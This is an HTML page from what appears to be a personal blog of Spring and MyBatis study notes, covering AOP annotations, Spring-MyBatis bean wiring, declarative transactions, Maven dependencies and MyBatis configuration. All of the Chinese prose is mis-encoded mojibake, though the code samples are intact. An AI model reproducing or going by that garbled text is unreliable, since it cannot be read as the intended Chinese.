<li><p>æ–¹å¼ä¸‰:ä½¿ç”¨æ³¨è§£å¼€å‘</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnotationPoint</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Before</span>(<span class="string">"execution(* com.huzai.pojo.User.* (..))"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====å¼€å§‹===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="Springæ•´åˆMybatis"><a href="#Springæ•´åˆMybatis" class="headerlink" title="Springæ•´åˆMybatis"></a>Springæ•´åˆMybatis</h2><h3 id="ä½¿ç”¨Spring-çš„æ•°æ®æº"><a href="#ä½¿ç”¨Spring-çš„æ•°æ®æº" class="headerlink" title="ä½¿ç”¨Spring çš„æ•°æ®æº"></a>ä½¿ç”¨Spring çš„æ•°æ®æº</h3><ul>
<li>å‚æ•°åŒ…æ‹¬è¿æ¥æ•°æ®åº“çš„æ‰€æœ‰å‚æ•°</li>
<li>ä»¥åŠå¯¹æ•°æ®è¿›è¡Œçº¦æŸçš„æ•°æ®æºè‡ªå¸¦çš„çº¦æŸ</li>
<li>ä¸€èˆ¬çš„æ•°æ®æºåŒ…æ‹¬ c3p0ã€druidã€dbcp</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dataSource"</span> <span class="attr">class</span>=<span class="string">"org.springframework.jdbc.datasource.DriverManagerDataSource"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driverClassName"</span> <span class="attr">value</span>=<span class="string">"com.mysql.jdbc.Driver"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"root"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">value</span>=<span class="string">"jdbc:mysql://localhost:3306/mybatis?				useSSL=false&amp;amp;useUnicode=true&amp;amp;encoding=utf8"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"asdqwe123."</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="æ„é€ SqlsessionFactory"><a href="#æ„é€ SqlsessionFactory" class="headerlink" title="æ„é€ SqlsessionFactory"></a>æ„é€ SqlsessionFactory</h3><ul>
<li>éœ€è¦è®¾ç½®å¦‚ä¸‹çš„å‚æ•°<ul>
<li>æ•°æ®æºdataSource</li>
<li>åŠ è½½mybatisçš„é…ç½®æ–‡ä»¶</li>
<li>mapperLocationçš„åœ°å€</li>
</ul>
</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"sqlSessionFactory"</span> <span class="attr">class</span>=<span class="string">"org.mybatis.spring.SqlSessionFactoryBean"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"dataSource"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"configLocation"</span> <span class="attr">value</span>=<span class="string">"classpath:mybatisConfig.xml"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mapperLocations"</span>  <span class="attr">value</span>=<span class="string">"classpath:com/huzai/mapper/*.xml"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="æ„é€ SqlsessionTemplete-sqlsession"><a href="#æ„é€ SqlsessionTemplete-sqlsession" class="headerlink" title="æ„é€ SqlsessionTemplete(sqlsession)"></a>æ„é€ SqlsessionTemplete(sqlsession)</h3><ul>
<li>éœ€è¦å°†å…¶æ³¨å…¥åˆ°ServiceImpl</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"sqlSessionTemplate"</span> <span class="attr">class</span>=<span class="string">"org.mybatis.spring.SqlSessionTemplate"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">"0"</span> <span class="attr">ref</span>=<span class="string">"sqlSessionFactory"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="å£°æ˜å¼äº‹ç‰©"><a href="#å£°æ˜å¼äº‹ç‰©" class="headerlink" title="å£°æ˜å¼äº‹ç‰©"></a>å£°æ˜å¼äº‹ç‰©</h2><h3 id="äº‹ç‰©"><a href="#äº‹ç‰©" class="headerlink" title="äº‹ç‰©:"></a>äº‹ç‰©:</h3><ul>
<li>è¦ä¹ˆéƒ½æˆåŠŸ,è¦ä¹ˆéƒ½å¤±è´¥!</li>
<li>æ¶‰åŠåˆ°æ•°æ®çš„ä¸€è‡´æ€§é—®é¢˜</li>
<li>ç¡®ä¿å®Œæ•´æ€§å’Œä¸€è‡´æ€§</li>
</ul>
<h3 id="äº‹ç‰©çš„ACIDåŸåˆ™"><a href="#äº‹ç‰©çš„ACIDåŸåˆ™" class="headerlink" title="äº‹ç‰©çš„ACIDåŸåˆ™;"></a>äº‹ç‰©çš„ACIDåŸåˆ™;</h3><ul>
<li>åŸå­æ€§</li>
<li>ä¸€è‡´æ€§</li>
<li>éš”ç¦»æ€§<ul>
<li>å¤šä¸ªä¸šåŠ¡å¯èƒ½æ“ä½œåŒä¸€ä¸ªèµ„æº,é˜²æ­¢æ•°æ®æŸå®³</li>
</ul>
</li>
<li>æŒä¹…æ€§</li>
</ul>
<h3 id="Springä¸­çš„äº‹ç‰©ç®¡ç†"><a href="#Springä¸­çš„äº‹ç‰©ç®¡ç†" class="headerlink" title="Springä¸­çš„äº‹ç‰©ç®¡ç†"></a>Springä¸­çš„äº‹ç‰©ç®¡ç†</h3><h4 id="ç”³æ˜å¼äº‹ç‰©-AOP"><a href="#ç”³æ˜å¼äº‹ç‰©-AOP" class="headerlink" title="ç”³æ˜å¼äº‹ç‰©:AOP"></a>ç”³æ˜å¼äº‹ç‰©:AOP</h4><h5 id="é…ç½®ç”³æ˜å¼äº‹ç‰©"><a href="#é…ç½®ç”³æ˜å¼äº‹ç‰©" class="headerlink" title="é…ç½®ç”³æ˜å¼äº‹ç‰©"></a>é…ç½®ç”³æ˜å¼äº‹ç‰©</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dataSourceTransactionManager"</span> <span class="attr">class</span>=<span class="string">"org.springframework.jdbc.datasource.DataSourceTransactionManager"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span>=<span class="string">"dataSource"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="ç»“åˆaopå®ç°çš„äº‹ç‰©çš„ç»‡å…¥"><a href="#ç»“åˆaopå®ç°çš„äº‹ç‰©çš„ç»‡å…¥" class="headerlink" title="ç»“åˆaopå®ç°çš„äº‹ç‰©çš„ç»‡å…¥"></a>ç»“åˆaopå®ç°çš„äº‹ç‰©çš„ç»‡å…¥</h5><ul>
<li>é…ç½®äº‹åŠ¡é€šçŸ¥</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">"txAdvice"</span> <span class="attr">transaction-manager</span>=<span class="string">"dataSourceTransactionManager"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        ç»™é‚£äº›æ–¹æ³•é…ç½®äº‹ç‰©--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        é…ç½®äº‹ç‰©çš„ä¼ æ’­ç‰¹æ€§--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"add"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>é…ç½®äº‹åŠ¡åˆ‡å…¥</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--    é…ç½®äº‹ç‰©çš„åˆ‡å…¥--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">              </span><br><span class="line">                <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">"txPointCut"</span> <span class="attr">expression</span>=<span class="string">"execution(* com.huzai.mapper.*.*(..))"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">"txAdvice"</span> <span class="attr">pointcut-ref</span>=<span class="string">"txPointCut"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="ç¼–ç¨‹å¼äº‹ç‰©-éœ€è¦åœ¨ä»£ç ä¸­è¿›è¡Œäº‹ç‰©çš„ç®¡ç†"><a href="#ç¼–ç¨‹å¼äº‹ç‰©-éœ€è¦åœ¨ä»£ç ä¸­è¿›è¡Œäº‹ç‰©çš„ç®¡ç†" class="headerlink" title="ç¼–ç¨‹å¼äº‹ç‰©:éœ€è¦åœ¨ä»£ç ä¸­è¿›è¡Œäº‹ç‰©çš„ç®¡ç†"></a>ç¼–ç¨‹å¼äº‹ç‰©:éœ€è¦åœ¨ä»£ç ä¸­è¿›è¡Œäº‹ç‰©çš„ç®¡ç†</h4><h2 id="æ‰€æœ‰çš„é…ç½®æ–‡ä»¶å¤´"><a href="#æ‰€æœ‰çš„é…ç½®æ–‡ä»¶å¤´" class="headerlink" title="æ‰€æœ‰çš„é…ç½®æ–‡ä»¶å¤´"></a>æ‰€æœ‰çš„é…ç½®æ–‡ä»¶å¤´</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">"http://www.springframework.org/schema/aop"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:jdbc</span>=<span class="string">"http://www.springframework.org/schema/jdbc"</span> <span class="attr">xmlns:tx</span>=<span class="string">"http://www.springframework.org/schema/tx"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/aop</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/aop/spring-aop.xsd </span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/jdbc http://www.springframework.org/schema/jdbc/spring-jdbc.xsd </span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/tx </span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/tx/spring-tx.xsd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="æ‰€æœ‰çš„dependency"><a href="#æ‰€æœ‰çš„dependency" class="headerlink" title="æ‰€æœ‰çš„dependency"></a>æ‰€æœ‰çš„dependency</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.49<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resource<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>

      
    </div>
    
  </section>
</article>

          </div>
        
      
        
          <div class="post-wrapper">
            <article class="post reveal ">
  


  <section class="meta">
    
    
    <div class="meta" id="header-meta">
      
        
  <h2 class="title">
    <a href="/2020/10/17/Mybatiså­¦ä¹ æ€»ç»“/">
      Mybatiså­¦ä¹ æ€»ç»“
    </a>
  </h2>


      
      <div class="new-meta-box">
        
          
        
          
            
  <div class="new-meta-item author">
    <a href="http://yoursite.com" rel="nofollow">
      
        <i class="fas fa-user" aria-hidden="true"></i>
      
      <p>John Doe</p>
    </a>
  </div>


          
        
          
            <div class="new-meta-item date">
  <a class="notlink">
    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
    <p>2020-10-17</p>
  </a>
</div>

          
        
          
            

          
        
          
            

          
        
          
            

          
        
      </div>
      
        <hr>
      
    </div>
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
      <h1 id="Mybatis-å­¦ä¹ æ€»ç»“"><a href="#Mybatis-å­¦ä¹ æ€»ç»“" class="headerlink" title="Mybatis å­¦ä¹ æ€»ç»“"></a>Mybatis å­¦ä¹ æ€»ç»“</h1><h2 id="åŸºæœ¬ç¯å¢ƒé…ç½®"><a href="#åŸºæœ¬ç¯å¢ƒé…ç½®" class="headerlink" title="åŸºæœ¬ç¯å¢ƒé…ç½®"></a>åŸºæœ¬ç¯å¢ƒé…ç½®</h2><h3 id="1-Mybatis-config-xml"><a href="#1-Mybatis-config-xml" class="headerlink" title="1.Mybatis-config.xml"></a>1.Mybatis-config.xml</h3><ul>
<li>é…ç½®å‚æ•°æŒ‰ç…§å¦‚æ­¤ä¸‹é¡ºåºé…ç½®-</li>
<li><strong>properties</strong>/<strong>settings</strong>/<strong>typeAliases</strong>/typeHandlers/objectFactory/objectWrapperFactory/plugins/<strong>environments</strong>/databaseIdProvider/<strong>mappers</strong></li>
<li>æ‰€æœ‰çš„*Mapper.xmléœ€è¦åœ¨Mapperä¸­æ³¨å†Œ</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE configuration</span></span><br><span class="line"><span class="meta">  PUBLIC "-//mybatis.org//DTD Config 3.0//EN"</span></span><br><span class="line"><span class="meta">  "http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">"development"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">"development"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">"JDBC"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">"POOLED"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driver"</span> <span class="attr">value</span>=<span class="string">"$&#123;driver&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">value</span>=<span class="string">"$&#123;url&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"$&#123;username&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"$&#123;password&#125;"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">"org/mybatis/example/BlogMapper.xml"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="2-æ„å»ºsqlsessionFactory"><a href="#2-æ„å»ºsqlsessionFactory" class="headerlink" title="2.æ„å»ºsqlsessionFactory"></a>2.æ„å»ºsqlsessionFactory</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String resource = <span class="string">"org/mybatis/example/mybatis-config.xml"</span>;</span><br><span class="line">InputStream inputStream = Resources.getResourceAsStream(resource);</span><br><span class="line">SqlSessionFactory sqlSessionFactory = <span class="keyword">new</span> SqlSessionFactoryBuilder().build(inputStream);</span><br></pre></td></tr></table></figure>
<p><img src="/home/huzai/ä¸‹è½½/Sqlsessionactoryæ„å»ºè¿‡ç¨‹.png" alt="Sqlsessionactoryæ„å»ºè¿‡ç¨‹"></p>
